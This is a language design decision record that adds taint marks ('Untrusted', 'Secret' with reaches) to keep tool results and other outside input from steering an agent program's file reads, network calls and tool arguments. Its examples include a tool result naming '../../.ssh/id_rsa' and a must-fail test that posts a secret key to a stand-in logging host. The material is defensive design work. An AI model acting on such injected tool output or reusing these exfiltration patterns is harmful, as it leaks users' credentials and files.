# 0004 - `Untrusted of T`

Decided for 9.0.0, September 2026. The design; the spec repository
carries it as a draft appendix marked "9.0, not yet normative", and
nothing is normative until 9.0 ships it in both runtimes.

**Amendment 1, at the end of this file, decided 2026-09-22 and before
M6 implements any of this**, gives both marks a *reach*: the set of
sinks a marked value may still reach, propagated by intersection and
never widened, after ChainCaps. Read this file first and the amendment
second; the amendment says which paragraphs here it changes, and
changes nothing else. Its status is this file's: 9.0 draft, not
normative.

## What is open

docs/runner.md says it, under "What is not here yet":

> A result is a `Text` like any other; nothing marks it as the host's
> words rather than the program's, so what a tool returns can steer a
> program anywhere inside its budget, though nowhere outside it.

THREAT_MODEL.md says the larger version of the same thing, in the Known
open table, under *Secrets arriving another way*: a value read through
`read_line`, passed in through `args()`, fetched over `net` or returned
by a tool is an ordinary `Text` with no protection.

`Secret of T` bounds where a value may **go**. Nothing bounds what a
value may **name**. Those are different problems and the second one is
the one an agent runtime has: the budget says `fs:read:./data` and
`tool:search@20`, and inside that a document a search tool returned can
choose which file under `./data` is read, which of the granted hosts is
reached, and what the next tool call's arguments say. Every one of those
is inside the budget. The budget was never going to catch it: a budget
bounds the set of resources, and this is a choice within the set.

**The case found in 8.5**, which `check_runner.py` records and this
decision closes:

    fn summarise(topic: Text) -> Text uses tool, fs or fail {
        let found = try tool("search", json_of({"query": topic}))
        let name = try json_get(found, "attachment")   // the host's words
        return try read_file("./data/" + name)          // inside fs:read:./data
    }

Run under `--allow io,fs:read:./data,tool:search@20`, every operation
here is granted. A `search` result that says `attachment:
"../../.ssh/id_rsa"` is refused - E313, because the budget resolves
paths - but one that says `attachment: "payroll.csv"` is not, and the
program reads and returns a file the topic never named. The same shape
sends the file to whichever granted host the document picks, and puts
whatever the document says into the next `tool` call's arguments. 8.5
shipped with this written down and the advice "grant the narrowest
budget its task needs"; that advice is right and is not a mechanism.

## What was decided

**`Untrusted of T` is `Secret of T`'s machinery, with a different set of
sinks and no rule about branching.** One mark implementation, two
instantiations - this is the central decision, and everything below
follows from it.

That means the rules of SPEC.md section 3.1 hold verbatim for
`Untrusted of T`, with `Untrusted` substituted for `Secret`: what
carries one (a value that is one, or holds one anywhere inside - a list,
a map's values, a record's field, a record with a field of such a
record); what keeps one (**every pure operation on a value that carries
the mark gives an `Untrusted` of its result type**, comparisons
included); what does not (a container's own shape - `length` of a `List
of Untrusted of Text`, `keys` of a map of them, `has`); that there is no
`Untrusted of Untrusted of T`; and that **no type variable is bound to a
type that carries one**, for the reason the Secret rule gives, which
applies unchanged: a generic body checked with `T` standing for nothing
in particular will hand `to_text(x)` back as a plain `Text`, and that is
laundering. The way to write a generic function over untrusted values is
to say so in the signature - `fn first(xs: Untrusted of List of T) ->
Untrusted of T for any T`.

### Where one comes from

| Builtin | Gives | Why |
|---|---|---|
| `fetch(url)`, `post(url, body)`, `request(m, url, body, headers)` | `Untrusted of Text` | a remote host chose the bytes |
| `fetch_status(url)` | `Untrusted of Int` | a remote host chose the number |
| `read_file(path)` | `Untrusted of Text` | the budget named the directory; nothing named the content |
| `read_line()`, `ask(prompt)` | `Untrusted of Text` | whoever is on the other end of standard input chose it |
| `args()` | `Untrusted of List of Text` | in an agent setting the command line is assembled by a model |
| `tool(name, arguments)` | `Untrusted of Text` | the case above |
| `db_query(handle, sql, params)` (new in 9.0, 0005) | `Untrusted of Text` | rows are what somebody else put in the table |

And nothing else. In particular:

- **`env()` is not one, and `read_file_secret` and `tool_secret` are not
  ones.** Each already returns a `Secret of T`, and a `Secret` reaches no
  sink at all without `declassify` - which needs the effect, the
  operator's grant and a reason written as text in the call, and is
  named in the audit. That is exactly what `trust` needs and does. A
  value gets one gate on the way to a sink, not two; two would be two
  written reasons for one decision, and an audit carrying both would say
  less, not more. `args()` and `read_line()` have no such gate, which is
  why they need this one.

  The counter-case is real and is answered elsewhere: an environment
  assembled by something that is not the operator. THREAT_MODEL.md
  already says "Do not start Sabline with an environment someone else
  controls - which was already true of `PATH` and `PYTHONPATH`", and the
  answer there is to withhold the `env` grant, not to mark the value. A
  program that knows its environment is assembled by something it does
  not trust writes `env_untrusted(name, fallback)`, new in 9.0, which
  gives `Secret of Untrusted of Text` - the same relation
  `read_file_secret` has to `read_file`.

- **A granted Python module's results are not ones.** `py`, `py_json`,
  `py_field` and `py_do` give ordinary values. THREAT_MODEL.md's rule
  for `ffi` is that the grant *is* the trust: "The allow-list narrows
  which module a call reaches, not what it does... treat the grant as
  trust in those modules." Marking every FFI result untrusted would put
  a `trust` call in every use of `csv.vel`, `dates.vel` and `db.vel`,
  and a mark that appears in every program stops being read. This leaves
  a real gap - `ffi:requests` fetches the network and hands back a body
  that is not marked - and it goes in THREAT_MODEL.md's Known open
  table as *Untrusted content through a granted module*, with the
  recommendation that a program that must mark such a value passes it
  through the library function that does, not through its own.

### Where one cannot go

An `Untrusted` value given to anything on this list is **E570**, which
names the value, the sink, and where the mark came from - the shape
E560 already uses.

| Sink | The argument that refuses one |
|---|---|
| `fetch`, `fetch_status`, `post` | the URL |
| `request` | the URL (its second argument) |
| `read_file`, `read_file_secret`, `write_file`, `file_exists` | the path |
| `py`, `py_int`, `py_float`, `py_json`, `py_new` | the module name, and every name in the attribute chain |
| `py_do`, `py_field` | the method or field name |
| `tool`, `tool_secret` | the tool's name, **and** its arguments text |
| `db_open`, `db_query`, `db_exec` (new in 9.0, 0005) | the path, and the `sql` text - **never** the `params` list |
| `import` | the path |

Three of those need saying out loud.

- **A tool's arguments are a sink, and a tool's result is a source.**
  That pair is what closes the case above: a document a `search` tool
  returned cannot become the argument of a `send_email` call. 8.5 holds
  tool arguments to the operator's patterns (E321); 9.0 adds that they
  may not be the host's own words.
- **A query's `sql` is a sink and its `params` are not.** That is the
  whole of the CWE-89 argument in 0005, stated as a type rule: an
  untrusted value cannot be part of the statement, and putting it in the
  parameter list - the only thing left to do with it - is the thing that
  was always correct. The fix is not advice; it is the only shape that
  compiles.
- **`import` is a sink and, in the reference, a vacuous one.** An import
  path is a literal read at compile time, so no runtime value can reach
  it and the rule refuses nothing today. It is stated and enforced
  anyway, so that a later dynamic import cannot open the hole by
  omission.

And what is **not** a sink, which matters as much:

- **Nothing that only emits.** `print`, `log`, `write_file`'s *content*,
  `post`'s *body*, `fail`'s reason, `exit_with`'s status. `Untrusted`
  bounds what a value may **name**, not where it may go; bounding where
  it may go is `Secret`'s job and doing both with one mark would make
  neither legible. A program may print what a tool said, and should.
- **No `if` or `while` rule.** There is no twin of E563, and this is the
  one place the two marks genuinely differ. Branching on a secret is an
  oracle; branching on untrusted data is **validation**, which is the
  thing a program ought to do with it. Refusing it would refuse the fix.

### The way out, and the better way out

`trust(value, reason)` takes an `Untrusted of T` and gives back the `T`.
It says so three times, as `declassify` does:

- the function doing it declares `uses trust`, checked across the whole
  call graph like any other effect (E300);
- `reason` is written as text in the call, not built while running, so
  `sabline audit` can report it without running the program (**E571**,
  which is also what a `trust` of something that is not `Untrusted`
  gets, and what an empty reason gets);
- the operator's budget grants `trust`, or the call is refused at the
  moment it is reached (E310), like any other effect.

`trust` is the tenth effect. It reaches nothing outside the program, for
the reason sabline-spec section 3.1 already gives about `declassify`:
it is an effect because it is the only operation that removes a mark the
type system put on, and because an operator who withholds it gets a
program that cannot launder anything.

**The better way out is not to call it.** The pattern that needs no
`trust` and no effect is to branch on the untrusted value and use the
program's own literal:

    let name = try json_get(found, "attachment")      // Untrusted of Text
    if name == "payroll.csv" {
        return try read_file("./data/payroll.csv")    // the program's word
    }
    fail "that attachment is not one this program reads"

That compiles with no `trust`, no grant and no audit entry, because
nothing untrusted reaches the sink: the comparison is allowed, the
literal is the program's. Every migration note, every error message and
the documentation say this before they mention `trust`.

### Both marks at once

A value carries both when two values are combined: `env("USER", "") ==
get(args(), 0)` is a `Secret of Untrusted of Bool`; a record with a secret
field and an untrusted field carries both, and so does `json_of` of it;
`hmac_sha256(key, body)` where `body` came off the network gives
`Untrusted of Text`, which is right - a MAC of attacker-influenced input
is attacker-influenced - and is still what the audit records as a
declassification.

- **The spelling is `Secret of Untrusted of T`**, always, with `Secret`
  outermost. `Untrusted of Secret of T` is **E572**, whose message gives
  the canonical spelling; so is a doubled mark of either kind, which is
  what E562 says today for `Secret of Secret of T` and what E572 says for
  `Untrusted of Untrusted of T`. One spelling, so that a signature, an
  error message and a golden all agree.
- **The two ways out are independent and neither implies the other.**
  `declassify` removes `Secret` and leaves `Untrusted`; `trust` removes
  `Untrusted` and leaves `Secret`. A value that is both needs both
  calls, both effects, both grants and two written reasons - which is
  correct, because they are two different statements, and it is also why
  neither of the three builtins that already return a `Secret` is
  additionally a source.
- **Sinks compose the obvious way.** A `Secret of Untrusted of Text` at
  a path argument is refused; the code given is E560, because a `Secret`
  reaches no effectful builtin at all and that is the stronger and
  earlier rule. E570 is given when the value carries `Untrusted` and not
  `Secret`.

### What a reader of documents sees

- **`sabline.audit/1` gains `untrusted`**, an object beside `secrets`
  and shaped like it, added within version 1 so a consumer that does not
  know it ignores it (sabline-spec section 8.1): `sources`, the sorted
  names of the source builtins the program as loaded reaches; `trusts`,
  true when it contains at least one `trust` call; and `trustings`, one
  object per call with `reason`, `function` and `line`, sorted. An
  implementation with no such type writes empty values, as it does for
  `secrets`. The whole field is null when the program could not be
  loaded.
- **A receipt gains `trustings`**, one object per distinct call with
  `reason`, `line` and `times` - `declassifications` exactly - and
  `effects_used` may hold `trust`. The rule that a receipt holds no
  value the program handled has no exception here: a reason is the text
  written in the program, never the value trusted.
- **SARIF gains the rule `value-trusted`**, at warning level, beside
  `secret-declassified`, with `--allow-trust-reasons` as the twin of
  `--allow-declassify-reasons`: a reviewed reason passes, a new one
  appears in the pull request. Under `--strict` it is an error unless
  listed. The compile-time codes E570, E571 and E572 become SARIF rules
  the way every code does, from `ERROR_TABLE`.
- **The capability predicate and the ratchet need no new rule at all.**
  `trust` is an effect, so it is in `effects`, in `safe_command` and in
  `sabline.capabilities/1` like any other, and a program that gains its
  first `trust` call widens its surface and fails `sabline capabilities
  check` until the baseline is changed in review - which is exactly what
  6.0's `declassify` did, and is the behaviour to want. sabline-spec
  section 9 changes only by the effect list growing.

## The compatibility story

**This is a break, and it is the largest one 9.0 makes.** Three shapes
of 8.x program stop compiling, and they are the same three shapes 6.0's
`env()` change stopped, for the same reason.

1. **A signature that says it returns `Text` and returns a source's
   result** - E503. `fn get(url: Text) -> Text uses net or fail { return
   try fetch(url) }` is `stdlib/http.vel` line 6.
2. **A `Text` variable, field or parameter holding one** - E501. `record
   Answer { status: Int, body: Text, raw: Text }` is `stdlib/http.vel`,
   and `RestAnswer` is `stdlib/rest.vel`.
3. **A source's result reaching a sink** - E570. This is the one the
   release is for, and the only one of the three that is a finding
   rather than a signature to widen.

Measured against this tree, at 8.6.0: **13 of 104 `examples/`, 6 of 14
`stdlib/` files and 47 of 85 `benchmark/corpus/` programs** call at
least one of the source builtins, and are the upper bound on what needs
attention. The shipped standard library changes in the same release:
`http.vel`'s `get`, `send`, `get_json` and `call`, `rest.vel`'s `call`,
and the four batteries built on them - `github.vel`, `k8s.vel`,
`aws.vel`, `azure.vel` - return `Untrusted` values, and `Answer` and
`RestAnswer` hold them. `http.status`'s `ensures result >= 0` becomes an
`Untrusted of Bool`, which is allowed: a promise is not a branch, and
sabline-spec's rule for a `Secret of Bool` promise covers it unchanged.

Touching a source is not the same as breaking, and the difference is
where most of the 66 programs above land. `examples/tools.vel` calls
`args()`, reads it with `get`, measures it with `length`, branches on
that length and prints every item through `format` - and compiles
unchanged, because printing is not a sink and branching is not refused.
What breaks is a program that annotates the value `Text`, returns it as
a `Text`, or hands it to something that names a resource. The migration
report separates the two, and the release note leads with the second.

**What `sabline migrate --to 9.0` does.** It reads a program or a tree
and reports, per file and per line: every value that becomes
`Untrusted`, where the mark came from, and which of the three shapes
above refuses it. `--write` changes only what is mechanical and
reversible - a `Text` annotation on a local, a field, a parameter or a
return type widened to `Untrusted of Text` where the checker can trace
the value to a source - and it re-checks the file afterwards, putting
back what it wrote if the file stopped compiling.

**`--write` never inserts a `trust` call.** Deciding that a particular
untrusted value may name a resource is the security decision this
release exists to surface; a tool that made it, and wrote a reason for
it, would be a tool that turns the release into a no-op. For every place
where only a `trust` or a validation will do, migrate prints the line,
the sink, the source, and both ways out - the comparison against a
literal first, `trust(value, "...")` second with the reason left blank
for a person to write. `sabline migrate --to 9.0 --json` gives the same
as `sabline.migrate/1`, so a repository can count what is left.

## What was rejected

- **Tainting only tool results**, which is the case 8.5 recorded. A mark
  that catches a `search` result steering a path and not a `read_file`
  result steering a URL is a mark whose boundary is an implementation
  detail of where the value came from, not a property a reader can
  state. The rule has to be "from outside the program".
- **A `Trusted of T` marking the safe values instead**, so that nothing
  existing breaks. It defaults the wrong way: every value a program has
  not thought about would be safe, and the interesting programs are the
  ones nobody thought about. The default has to refuse, for the reason
  5.0 changed the default budget to `io`.
- **A branch rule, the twin of E563.** Refusing `if name ==
  "payroll.csv"` would refuse validation, which is the fix.
- **Making `trust` pure**, with no effect and no grant. Then an operator
  could not run a program with the laundering switched off, and a
  program's audit could not be read for whether it launders at all. The
  effect is most of the value.
- **A second, weaker mark for values a program has validated**, so that
  the checker could tell a validated value from a trusted one. It is a
  dataflow claim the type system cannot check without dependent types,
  and a mark the compiler cannot check is a decoration. The comparison
  pattern above gets the same result with no new type: a program that
  validates ends up using its own literal.

---

# Amendment 1 - a mark carries a reach

Decided 2026-09-22, **before M6**, which is the milestone that
implements this decision (`plan/9.0.md`). It amends the decision above
rather than replacing it: everything written above stands unless this
section says otherwise, and where it says otherwise it says which
paragraph it changes.

Status: **9.0 draft, not normative** - the same status the decision
above has, and it does not become normative until 9.0 ships it in both
runtimes. `SPEC.md` §3.1 and §7.2 carry a note saying so.

## Where this comes from, and it is not this project

ChainCaps [arXiv:2605.26542, AIWILD at ICML 2026] attaches to every
value a *sink-specific capability budget* - the set of `(operation,
scope)` sinks that value may still reach - and propagates it through a
chain of tool calls by intersection: a tool's output carries the tool's
own pass-through budget intersected with the budget of every input. A
value can lose authority by composition and can never gain it, which
they call **monotonic attenuation**. It answers what they name
**permission laundering**: reading a confidential document, summarising
it, and sending the summary somewhere it should not go, where each call
on its own passes its own permission check.

That is the same problem the decision above opens with, stated better
than it was stated there, and the propagation rule is theirs. This
amendment takes it. `paper/sabline.md` §5 says so, and so does this
paragraph, because a design decision with a source should name it.

Their mechanism is a runtime proxy over an MCP session. Sabline's is a
type rule decided before the run. The differences that follow from that
are in **What this does not give** at the end.

## What was decided

**A mark carries a reach: the set of sinks the value it marks may still
reach.** One rule for both marks, as the decision above has one mark
implementation for two instantiations.

    Secret of Text                              reaches nothing
    Secret reaching net:api.corp.com of Text    reaches that host, and nothing else
    Untrusted of Text                           may name nothing
    Untrusted reaching fs:read:./data of Text   may name a file under ./data, and nothing else

`Secret of T` and `Untrusted of T` are the empty reach, which is what
they mean today and above. **Every existing rule, error code, message
and golden is the empty-reach case of the rule below**, so nothing that
compiles today stops compiling because of this amendment, and nothing
that is refused today stops being refused. The amendment adds a way to
say less than "nothing", and refuses everything that is not said.

### The reach grammar is the budget grammar

A reach is written in the grant grammar of `SPEC.md` §7.1 - the same
text an operator writes in a budget - and nothing else: `io`, `fs:read:P`,
`fs:write:P`, `net:HOST`, `tool:NAME`, `ffi:MODULE`, `db:read`,
`db:write`, `clock`, `rand`. One grammar, so that a reach, a budget, an
audit and an error message all say a sink the same way, and so that a
person who can read one can read the others. `all` is **not** a reach:
a reach that is everything is no reach, and the way to say it is to
remove the mark with `declassify` or `trust`, which is audited.

### The four rules

1. **Intersection.** Every pure operation on values gives a result
   whose reach is the **intersection** of the reaches of its operands.
   An unmarked value has the full reach and is therefore the identity
   of intersection, which is why nothing that compiles today moves.
   This replaces the sentence in *What was decided* above that every
   pure operation on a value that carries the mark gives an
   `Untrusted` of its result type: it still does, and now the amendment
   says which reach it carries.

2. **Monotonic.** No operation widens a reach. There is no union
   anywhere in the rule, and no builtin returns a value whose reach is
   wider than that of what it was given. The only two operations that
   remove a mark - and with it the reach - are `declassify` and
   `trust`, each of which is an effect, needs the operator's grant,
   needs a reason written as text in the call, and is named in the
   audit.

3. **A declared reach must be a subset of the actual one.** Wherever a
   reach is written - a parameter, a return, a field, a local's
   annotation - it must be covered by the reach the value actually has,
   and a declaration wider than the value is **E573**. Declaring
   *narrower* is allowed and is the conservative direction, exactly as
   declaring an effect a function does not use is allowed. This is the
   one place the rule for a reach differs from the rule for an effect,
   and it differs because a reach bounds what a caller may do with the
   value and an effect bounds what the callee does.

4. **The budget is the ceiling, and the operator sets it.** A reach
   that is not empty is a widening, and a program may not grant itself
   one. The budget gains one grant kind, `reach:<grant>`, and a run
   whose program declares a reach the budget does not grant is refused
   **before its first statement** - **E574**, beside E310's family, so
   an operator who withholds every `reach:` grant gets exactly the
   behaviour of the decision above and of 6.0's `Secret`. A `reach:`
   grant that is not covered by an effect grant of the same budget is a
   budget that does not parse (**E575**): `reach:net:api.corp.com`
   without `net:api.corp.com` would be a grant that can never apply, and
   a grant that can never apply is more likely a mistake than an
   intention.

### What this is for

The case that makes it worth the grammar is a credential that has
exactly one place to go.

Today, and under the decision above, `env("API_KEY", "")` is a `Secret
of Text` that reaches no effectful builtin at all, so sending it to the
API it belongs to needs `declassify` - which removes the mark
altogether, after which the value is an ordinary `Text` that the rest
of the program may send anywhere. The gate is in the right place and
opens too far.

With a reach, it opens exactly as far as it should:

    fn call(key: Secret reaching net:api.corp.com of Text, body: Text)
        -> Untrusted of Text uses net or fail
    {
        return try post("https://api.corp.com/v1", body, key)
    }

run under `--allow io,net:api.corp.com,reach:net:api.corp.com`. No
`declassify`, no `declassify` effect, no grant for it, and no audit
entry for a declassification that did not happen - because none did.
The key is still a `Secret` everywhere else in the program: printing it
is E560, writing it to a file is E560, and sending it to any other host
is **E573**, which names the value, the sink and the reach.

The `Untrusted` half is the same shape applied to the 8.5 case. A
`search` tool whose results are only ever attachment names under
`./data` can be given `Untrusted reaching fs:read:./data of Text`, and
then `read_file("./data/" + name)` compiles with no `trust` - but only
under a budget that says `reach:fs:read:./data`, and the path is still
resolved at run time, so an attachment named `../../.ssh/id_rsa` is
E313 as it is today. **The comparison against the program's own literal
is still the better way out**, and every migration note, error message
and document says it before it mentions a reach, exactly as the
decision above says them before `trust`.

## What it refuses

- **A marked value at a sink its reach does not cover: E573.** The
  message names the value, the sink, the reach, and where the mark came
  from - the shape E560 and E570 already use. The empty-reach case
  keeps its existing code, so `Secret of Text` at `print` is E560 as
  today and `Untrusted of Text` at a path is E570 as above; E573 is
  given only where a non-empty reach failed to cover a sink, so a
  reader can tell "this value reaches nothing" from "this value reaches
  somewhere, and not here".
- **A declared reach wider than the value's: E573**, at the
  declaration.
- **A reach the budget does not grant: E574**, before the first
  statement.
- **A `reach:` grant with no matching effect grant: E575**, at budget
  parse, before anything runs.
- **A reach on an unmarked type.** `Text reaching net:h` is not a type.
  A reach narrows a mark; there is nothing to narrow without one.
- **`all`, `*` and any wildcard host or path in a reach**, for the
  reason the grammar paragraph gives.
- **Nothing that only emits changes.** The list in *Where one cannot
  go* above stands: `print`, `log`, `write_file`'s content, `post`'s
  body, `fail`'s reason and `exit_with`'s status are sinks for `Secret`
  and are not sinks for `Untrusted`, with or without a reach.
- **No branch rule changes.** E563 refuses branching on a `Secret`
  whatever its reach - a reach is about where a value may go, not about
  what may be learned from it - and there is still no twin of E563 for
  `Untrusted`, for the reason the decision above gives: branching on
  untrusted data is validation, and refusing it would refuse the fix.

## The interaction with the existing Secret rules

Each of `SPEC.md` §3.1's rules, and what this amendment does to it:

| §3.1 rule | Under the amendment |
|---|---|
| The three sources (`env`, `read_file_secret`, `tool_secret`) return `Secret of T` | Unchanged. A source's reach is **empty**, always. A wider reach is only ever written in a signature, and only where the budget grants it. |
| A program cannot make a Secret out of a value it holds | Unchanged, and now also: a program cannot widen the reach of one it holds. |
| E560 at a builtin that declares an effect, or one that can fail | Unchanged as the empty-reach case. With a non-empty reach the sink is checked against it, and a sink outside it is E573. A builtin that can fail is **never** in any reach: its reason is `Text` the program may print, so covering it would launder the value through a message. That is not a special case, it is the same rule - the reason is an emitting sink and no reach names it. |
| No `Secret of Secret of T` (E562) | Unchanged. Two reaches on one mark do not arise; a doubled mark is still E562 whatever either says. |
| No branching on a Secret (E563) | Unchanged, as above. |
| No type variable bound to a type that carries a mark | Unchanged, and for the same reason: a generic body checked with `T` standing for nothing in particular would hand back a plain `T` and lose the reach with the mark. `fn first(xs: Secret reaching R of List of T) -> Secret reaching R of T for any T` is how to write it. |
| `declassify(value, reason)` | Unchanged. It removes the mark and the reach together. It is still needed for every sink a reach does not cover, and is **not** needed for one it does - which is the whole of the amendment's benefit and also its whole risk, so the audit says which (below). |
| `Secret of Untrusted of T`, `Secret` outermost (E572) | Unchanged as a spelling. With reaches: `Secret reaching R1 of Untrusted reaching R2 of T`, and the sinks the value may reach are **R1 ∩ R2** - the intersection rule applied to nesting rather than to an operation. E560 is still given in preference to E570 and E573 when the value carries `Secret` and the sink is outside R1, because a Secret's rule is the stronger and earlier one. |
| The two ways out are independent | Unchanged. `declassify` removes `Secret` and its reach and leaves `Untrusted` and its reach; `trust` does the reverse. |

## Three cases that must fail

These are the cases `check_secret.py` and `check_runner.py` must hold,
and they are written here so that an implementation cannot pass by
choosing its own. Each is stated as a program, a budget and the code it
must get. The first three are the ones this amendment exists for; the
rest are the ones that would quietly undo it.

**1. Laundering by composition.** The value that reaches one host must
not reach another by being combined with something that reaches it.

    fn leak(key: Secret reaching net:api.corp.com of Text) -> Text
        uses net or fail
    {
        return try post("https://logs.example.com/ingest", key, "")
    }

Budget: `--allow io,net:api.corp.com,net:logs.example.com,reach:net:api.corp.com,reach:net:logs.example.com`.
Both hosts are granted, both are reachable by *some* value, and this
one's reach names only the first. **E573**, naming `logs.example.com`
as the sink and `net:api.corp.com` as the reach. A run that passes this
has no rule at all.

**2. Laundering by intersection read as union.** Two marked values
combined must give the intersection of their reaches, never the union.

    fn mac(key: Secret reaching net:api.corp.com of Text,
           body: Untrusted reaching fs:read:./data of Text) -> Text
        uses net or fail
    {
        let tag = hmac_sha256(key, body)         // Secret of Untrusted of Text
        return try post("https://api.corp.com/v1", tag, "")
    }

The two reaches are disjoint, so `tag`'s reach is **empty** and it
reaches nothing - not `net:api.corp.com`, although the key does, and
not `fs:read:./data`, although the body does. **E573**. The decision
above already says a MAC of attacker-influenced input is
attacker-influenced; the amendment says the sharper thing, which is
that it is also no longer the key's to send. An implementation that
unions here is the one bug that makes the whole rule decorative, and
this case is why it is written down.

**3. Widening by declaration.** A signature must not be able to promise
a reach the body cannot produce.

    fn widen(x: Secret reaching net:api.corp.com of Text)
        -> Secret reaching net:api.corp.com,net:logs.example.com of Text
    {
        return x
    }

**E573 at the return type**, not at the `return`, because the defect is
in what the signature claims. The body produces a value reaching one
host and the signature offers callers two. This is the rule-3 case, and
it is the direction in which a reach differs from an effect: a function
may declare an effect it does not use, and may not declare a reach its
value does not have.

**4. Granting yourself a reach.** The same program as the `call`
example above, run under `--allow io,net:api.corp.com` with no
`reach:` grant: **E574**, before the first statement, naming the reach
the program declares and the grant the budget lacks. An operator who
writes no `reach:` grant gets the decision above, unamended, and that
must be exactly true rather than nearly true.

**5. A reach that outruns the budget.** `--allow io,reach:net:api.corp.com`,
with no `net:` grant: **E575**, at budget parse. And
`--allow io,net:api.corp.com,reach:net:*`: **E575** too, because a
wildcard is not a reach.

**6. A reach is not a path resolver.** With `Untrusted reaching
fs:read:./data of Text` and `reach:fs:read:./data` granted, a value of
`"../../.ssh/id_rsa"` given to `read_file("./data/" + name)` is
**E313** at run time, as it is today. The reach settled that the value
may name *something* under `./data`; the budget settles what `./data`
is. Two checks, both needed, and neither replaces the other.

## What a reader of documents sees

- **`sabline.audit/1`'s `secrets` and `untrusted` objects each gain
  `reaches`**: one object per distinct declared reach, with `reach`
  (the grant text, canonically sorted), `function` and `line`, sorted -
  the shape `trustings` and `declassifications` already have. Added
  within version 1, so a consumer that does not know the field ignores
  it (sabline-spec §8.1). Empty where an implementation has no such
  type, as `secrets` already is.
- **A receipt gains `reaches_used`**, the sorted grant texts of the
  reaches a run actually relied on - that is, the sinks a marked value
  was permitted to reach and did. A reach that was declared and never
  used does not appear, because a receipt says what happened. No value
  the program handled is in it: a reach is grant text, never data.
- **SARIF gains the rule `value-reached`**, at warning level, beside
  `secret-declassified` and `value-trusted`, with
  `--allow-reach-declarations` as the twin of
  `--allow-declassify-reasons`. A reviewed reach passes; a new one
  appears in the pull request. Under `--strict` it is an error unless
  listed. **This is the field that matters most in review**, because a
  reach is the one way a value gets to a sink without a written reason,
  and the trade the amendment makes is a reason for a review.
- **The ratchet and the capability predicate need no new rule.** A
  `reach:` grant is a grant, so it is in the budget, in the declared
  surface and in `sabline.capabilities/1` like any other, and a program
  that gains its first one widens its surface and fails `sabline
  capabilities check` until the baseline is changed in review. That is
  6.0's `declassify` and 9.0's `trust` again, and it is the behaviour
  to want.

## What this does not give, and how it differs from ChainCaps

Said plainly, because the amendment borrows a mechanism and does not
borrow its guarantee.

- **It is per type, not per value.** ChainCaps tracks a budget on every
  value at run time. Sabline tracks a reach on a type at compile time.
  Two values in one `List of Untrusted reaching R of Text` share one
  reach, and it is the intersection of what each of them would have had
  on its own. That is sound - it can only be narrower than the truth -
  and it is coarser, and a program that needs two reaches in one
  collection has to use two types.
- **It sees only what the type system sees.** A value that leaves
  through a granted `ffi` module and comes back is unmarked and has the
  full reach, exactly as the decision above says of `py`, `py_json`,
  `py_field` and `py_do`. That gap is `THREAT_MODEL.md`'s *Untrusted
  content through a granted module*, and a reach does not close it.
- **It is decided before the run, so it cannot use what only a run
  knows.** ChainCaps' proxy sees the actual dataflow of an actual
  session and can be exactly as tight as that session; a type rule has
  to be as tight as every session at once. Where they differ, Sabline
  is the more conservative and the less useful, and that is the price
  of not needing a proxy and of the answer being in the signature.
- **It does not address what ChainCaps' authors say they do not
  address either**: covert channels, implicit flows through a model's
  own state, a compromised tool server, or an error in the policy - in
  Sabline's case, a reach an operator granted too widely. A reach is a
  written decision by an operator and is exactly as good as that
  decision, which is why SARIF surfaces it in review.
- **It is not a security boundary**, for the reason `THREAT_MODEL.md`
  gives about all of this: the checks are in a compiler and an
  interpreter, and the operating-system layer beneath them (8.4) holds
  budgets, not reaches. A reach is a rule about a source text.

## What was rejected

- **Inferring reaches instead of declaring them.** A checker could
  compute the narrowest reach each value could have and never make
  anybody write one. It was rejected because the answer would then be
  in the compiler rather than in the signature, a reader of a function
  could not tell what its caller may do with the result, and the thing
  a reviewer must see - that some value is now allowed to reach a host
  - would be invisible in the diff. Sabline puts what matters in
  signatures; a reach matters.
- **A reach on unmarked values**, so that every value in the program
  carried one. It is ChainCaps' own arrangement and is right for a
  runtime proxy. Here it would put a reach in every signature in every
  program, and a mark that appears everywhere stops being read - the
  same argument the decision above gives for not marking FFI results.
- **Union at a join.** If two branches of a `check` give values with
  different reaches, the result's reach is the intersection, not the
  union. Union is the rule that reintroduces laundering, and case 2
  above is the test that says so.
- **Letting a program widen its own reach with a written reason**, the
  way `declassify` and `trust` work. Those two remove a mark entirely
  and are loud about it: an effect, a grant, a reason and an audit
  entry. A reach is quiet by design - that is its benefit - and a quiet
  operation that a program can grant itself is not a control. The
  operator's `reach:` grant is what makes the quiet one safe.
- **Making `reach:` a per-source grant** (`reach:tool:search=fs:read:./data`),
  which is closer to ChainCaps' manifests. It was rejected for 9.0 as
  grammar that cannot be justified before anything has shipped: the
  simple form is a strict subset of it, and if the simple form proves
  too coarse in use, the per-source form is a compatible extension and
  this paragraph is the record that it was considered.
